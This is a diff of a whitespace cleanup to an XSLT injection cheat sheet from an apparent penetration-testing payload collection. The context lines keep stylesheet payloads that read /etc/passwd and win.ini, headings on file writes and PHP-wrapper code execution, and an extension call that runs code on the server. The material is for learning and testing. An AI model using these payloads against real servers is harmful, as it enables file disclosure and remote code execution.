@@ -2,7 +2,6 @@
 
 > Processing an un-validated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code
 
-
 ## Summary
 
 - [Tools](#tools)
@@ -17,11 +16,9 @@
 - [Labs](#labs)
 - [References](#references)
 
-
 ## Tools
 
 No known tools currently exist to assist with XSLT exploitation.
-
 
 ## Methodology
 
@@ -31,7 +28,7 @@ No known tools currently exist to assist with XSLT exploitation.
 <?xml version="1.0" encoding="utf-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/fruits">
-	<xsl:value-of select="system-property('xsl:vendor')"/>
+ <xsl:value-of select="system-property('xsl:vendor')"/>
   </xsl:template>
 </xsl:stylesheet>
 ```
@@ -76,7 +73,7 @@ Don't forget to test for XXE when you encounter XSLT files.
     <xsl:copy-of select="document('/etc/passwd')"/>
     <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
     Fruits:
-	    <!-- Loop for each fruit -->
+     <!-- Loop for each fruit -->
     <xsl:for-each select="fruit">
       <!-- Print name: description -->
       - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
@@ -85,10 +82,9 @@ Don't forget to test for XXE when you encounter XSLT files.
 </xsl:stylesheet>
 ```
 
-
 ### Write Files with EXSLT Extension
 
-EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. 
+EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language. EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions to the XSLT (Extensible Stylesheet Language Transformations) language.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -104,7 +100,6 @@ EXSLT, or Extensible Stylesheet Language Transformations, is a set of extensions
   </xsl:template>
 </xsl:stylesheet>
 ```
-
 
 ### Remote Code Execution with PHP Wrapper
 
@@ -238,17 +233,15 @@ return proc.StandardOutput.ReadToEnd();
 
   <xsl:template match="/fruits">
   --- BEGIN COMMAND OUTPUT ---
-	<xsl:value-of select="user:execute()"/>
-  --- END COMMAND OUTPUT ---	
+ <xsl:value-of select="user:execute()"/>
+  --- END COMMAND OUTPUT --- 
   </xsl:template>
 </xsl:stylesheet>
 ```
 
-
 ## Labs
 
 - [Root Me - XSLT - Code execution](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)
-
 
 ## References
 
